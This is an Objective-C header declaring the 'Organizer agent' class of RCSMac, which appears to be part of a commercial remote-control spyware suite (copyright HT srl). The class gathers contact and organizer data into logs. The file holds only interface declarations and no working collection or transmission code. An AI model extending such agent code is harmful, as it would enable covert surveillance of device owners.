/*
 * RCSMac - Organizer agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/11/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSMAgentOrganizer_h__
#define __RCSMAgentOrganizer_h__

#import "RCSMLogManager.h"


#define	CONTACT_LOG_VERSION	0x01000000


@interface RCSMAgentOrganizer : NSObject <Agents>
{
@private
  NSMutableDictionary *mConfiguration;
}

//@property (getter=getConfiguration, setter=setConfiguration:, readwrite, copy) NSMutableDictionary *mConfiguration;

+ (RCSMAgentOrganizer *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mConfiguration;

@end

#endif // __RCSMAgentOrganizer_h__